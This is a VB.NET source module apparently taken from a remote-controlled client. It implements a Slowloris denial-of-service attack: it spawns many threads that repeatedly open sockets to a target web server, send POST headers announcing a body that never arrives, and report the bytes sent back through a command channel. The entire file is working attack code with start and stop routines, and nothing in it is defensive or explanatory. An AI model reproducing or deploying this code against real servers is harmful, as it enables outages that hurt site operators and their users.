﻿Option Strict Off
Imports System.Collections.Generic
Imports System.Text
Imports System.Threading
Imports System.Net.Sockets
Imports System.Net
Imports System.Diagnostics
Imports Microsoft.VisualBasic
Public Module Slowloris
    Private ThreadsEnded = 0
    Private PostDATA As String
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private ThreadstoUse As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private attacks As Integer = 0
    Dim BytesSent As Integer = 0


    Public Sub StartSlowloris(ByVal Host As String, ByVal Threadsto As Integer, ByVal Time As Integer, ByVal data As String)

        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = Host
            PostDATA = data
            ThreadstoUse = Threadsto
            TimetoAttack = Time

            If HostToAttack.Contains("http://") Then HostToAttack = HostToAttack.Replace("http://", String.Empty)
            If HostToAttack.Contains("www.") Then HostToAttack = HostToAttack.Replace("www.", String.Empty)
            If HostToAttack.Contains("/") Then HostToAttack = HostToAttack.Replace("/", String.Empty)

            Threads = New Thread(Threadsto - 1) {}

            For i As Integer = 0 To Threadsto - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else



        End If

    End Sub
    Private Sub lol()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False

            attacks = 0
        End If

    End Sub

    Public Sub StopSlowloris()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            attacks = 0

        Else
        End If
    End Sub

    Private Sub DoWork()
        Try
            Dim socketArray As Socket() = New Socket(100 - 1) {}
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = stopwatch.StartNew
            Do While (stopwatch.Elapsed < span)
                Try
                    Dim i As Integer
                    Dim Http As New WebClient()
                    For i = 0 To 100 - 1
                        socketArray(i) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                        socketArray(i).Connect(Dns.GetHostAddresses(HostToAttack), 80)
                        Dim NewByte() As Byte = ASCIIEncoding.Default.GetBytes("POST / HTTP/1.1" & ChrW(13) & ChrW(10) & "Host: " & HostToAttack.ToString() & ChrW(13) & ChrW(10) & "Content-length: 5235" & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10))
                        socketArray(i).Send(NewByte, SocketFlags.None)
                        attacks += 1
                        BytesSent += NewByte.Length + 5235
                    Next i
                    SendMiscCommandSST(BytesSent)
                    WriteLog("[SST] Client has sent " & BytesSent & " bytes")
                    BytesSent = 0
                    Dim j As Integer
                    For j = 0 To 100 - 1
                        socketArray(j).Close()
                    Next j
                    Continue Do
                Catch

                    Continue Do
                End Try
            Loop
        Catch : End Try
        lol()
    End Sub
End Module
